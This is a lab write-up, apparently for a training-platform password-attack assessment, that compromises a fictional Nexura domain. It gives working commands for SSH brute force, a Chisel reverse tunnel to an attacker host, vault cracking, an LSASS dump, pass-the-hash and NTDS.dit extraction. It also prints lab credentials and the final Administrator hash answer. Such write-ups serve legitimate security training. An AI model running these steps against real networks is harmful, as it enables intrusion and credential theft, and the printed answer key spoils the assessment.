

## Skill Assessment

`Betty Jayde` works at the site [`Nexura LLC`]. We know that she uses the password `Texas123!@#` across multiple websites and we believe she may be reusing it at work. The objective is to infiltrate the Nexura network and obtain command execution access on the Domain Controller.
The following hosts are in scope for this assessment:

| Host     | IP Address                                                  |
| -------- | ----------------------------------------------------------- |
| `DMZ01`  | `10.129.*.*` **(External)**, `172.16.119.13` **(Internal)** |
| `JUMP01` | `172.16.119.7`                                              |
| `FILE01` | `172.16.119.10`                                             |
| `DC01`   | `172.16.119.11`                                             |

---

## Initial Pivot

The internal hosts (`JUMP01`, `FILE01`, `DC01`) reside in a private subnet that is not directly accessible from our attack host. The only externally accessible system is `DMZ01`, which has a second network interface connected to the internal network.

This segmentation reflects a classic DMZ configuration, where public-facing services are isolated from internal infrastructure.

To reach the internal systems, we must first establish access to `DMZ01`. From there, we can **pivot** our traffic through the compromised host into the private network. This allows our tools to communicate with internal hosts as if they were directly accessible. After compromising the DMZ host, consult the `cheatsheet` module for the required commands to configure the pivot and continue the assessment.

---

### Question

**What is the NTLM hash of `NEXURA\Administrator`?**

---

## Port Enumeration with Nmap

```powershell
nmap -p- --open --min-rate 5000 -Pn -n -sSVC 10.129.19.54
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We observe that **only port `22/SSH` is open**.

---

## Username Discovery and SSH Access

We already have the name `Betty Jayde` and the password `Texas123!@#`, which may be reused.
First, we need to discover the correct username. For this, we use two tools:

1. **Username-Anarchy** – Generates a wordlist of possible usernames based on common naming conventions.
2. **Hydra** – Performs brute-force authentication against the SSH service.

---

 **Generate Username Dictionary with Username-Anarchy**

```powershell
./username-anarchy --input name.list > names.list
```

Generated usernames:

```bash
cat names.list
betty
bettyjayde
betty.jayde
bettyjay
bettjayd
bettyj
b.jayde
bjayde
jbetty
j.betty
jaydeb
jayde
jayde.b
jayde.betty
bj
```

---

### SSH Brute Force with Hydra

```powershell
hydra -L names.list -p 'Texas123!@#' ssh://10.129.19.54
```

```
[22][ssh] host: 10.129.19.54   login: jbetty   password: Texas123!@#
```

---

## SOCKS Proxy via SSH

```bash
ssh -D 9505 jbetty@10.129.19.54
```

The `-D` option creates a SOCKS proxy that encrypts and redirects application traffic through the SSH server.

---

## Credential Discovery

While enumerating the system, we inspect `.bash_history` and discover credentials for the user `hwilliam`:

```bash
cat .bash_history

sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
```

---

## Pivoting with Chisel

We use **Chisel** to create dynamic port forwarding and redirect traffic to our attack machine.

 **Chisel on the Attacker Machine**

```bash
sudo ./chisel server --reverse
```

```
2025/10/24 03:06:01 server: Reverse tunnelling enabled
2025/10/24 03:06:01 server: Fingerprint r+u0frDqCY1FqPt3OJwGn4MKqb6tZFkQXqWgKCzJNuA=
2025/10/24 03:06:01 server: Listening on http://0.0.0.0:8080
2025/10/24 03:07:03 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

### Chisel on the Victim Machine

```bash
jbetty@DMZ01:~$ ./chisel client 10.10.15.9:8080 R:socks
```

```
2025/10/24 08:06:31 client: Connecting to ws://10.10.15.9:8080
2025/10/24 08:06:35 client: Connected (Latency 91.732951ms)
```

---

## Proxychains Configuration

Edit `/etc/proxychains4.conf`:

```bash
proxy_dns
dynamic_chain
#strict_chain
[ProxyList]
socks5  127.0.0.1 1080
```

Verify the SOCKS listener:

```bash
ss -ltnp | grep 1080 || lsof -i :1080
```

---

## Port Enumeration on FILE01

```bash
proxychains4 nmap -sT -Pn -p 1-1000 172.16.119.10
```

Port `445` is open and valid credentials are available.

---

## SMB Enumeration with CrackMapExec

```bash
proxychains crackmapexec smb 172.16.119.10 -u hwilliam -p 'dealer-screwed-gym1' --shares
```

```
SMB 172.16.119.10 445 FILE01 [+] nexura.htb\hwilliam:dealer-screwed-gym1
```

Shares discovered:

```
HR        READ,WRITE
PRIVATE   READ,WRITE
TRANSFER  READ,WRITE
```

---

## Password Vault Discovery

In the `HR` share, we find the file:

```
Employee-Passwords_OLD.psafe3
```

 **Download the File**

```bash
proxychains4 smbclient //172.16.119.10/HR -U 'NEXURA\\hwilliam%dealer-screwed-gym1' -I 172.16.119.10 -m SMB2
```

```bash
get Employee-Passwords_OLD.psafe3
```

---

## Cracking the Password Vault

Extract the hash:

```bash
pwsafe2john Employee-Passwords_OLD.psafe3 > pass.txt
```

Crack with John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
```

```
michaeljackson (Employee-Passwords_OLD)
```

---

## Open PasswordSafe Vault

```bash
pwsafe Employee-Passwords_OLD.psafe3
```

<img src="/budahacksecurity_static/uploads/md_images/password_attack/ps1.png" style="max-width:100%; border-radius:8px;">

Extracted credentials:

```bash
bdavid    -> caramel-cigars-reply1
stom      -> fails-nibble-disturb4
hwilliam  -> warned-wobble-occur8
jbetty    -> xiao-nicer-wheels5
```

---

## Pivot to JUMP01 (RDP)

Using **Remmina**:

```bash
proxychains4 remmina
```

<img src="/budahacksecurity_static/uploads/md_images/password_attack/ps3.png" style="max-width:100%; border-radius:8px;">

---

## LSASS Credential Dump

From **Task Manager**:

1. Open *Processes*
2. Right-click **Local Security Authority Process**
3. Select **Create dump file**

<img src="/budahacksecurity_static/uploads/md_images/password_attack/ps2.png" style="max-width:100%; border-radius:8px;">

Transfer `lsass.dmp` via shared folder:

<img src="/budahacksecurity_static/uploads/md_images/password_attack/ps4.png" style="max-width:100%; border-radius:8px;">

---

## Extract Hashes with Pypykatz

```bash
pypykatz lsa minidump lsass.DMP > pypikataz.txt
```

NTLM hash of user `stom`:

```bash
21ea958524cfd9a7791737f8d2f764fa
```

---

## Pass-the-Hash (Domain Controller)

```bash
proxychains xfreerdp3 /v:172.16.119.11 /u:NEXURA\stom /pth:21ea958524cfd9a7791737f8d2f764fa
```

Verify group membership:

```cmd
net user stom
```

User `stom` is a **Domain Admin**.

---

## NTDS Extraction

Create a shadow copy:

```cmd
vssadmin CREATE SHADOW /For=C:
```

Copy NTDS and SYSTEM:

```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Users\Administrator\NTDS.dit
reg save HKLM\system C:\Users\Administrator\system.save
```

<img src="/budahacksecurity_static/uploads/md_images/password_attack/ps5.png" style="max-width:100%; border-radius:8px;">

---

## Dump Administrator Hash

```bash
impacket-secretsdump -ntds NTDS.dit -system system.save LOCAL
```

NTLM hash of `NEXURA\Administrator`:

```bash
36e09e1e6ade94d63fbcab5e5b8d6d23
```

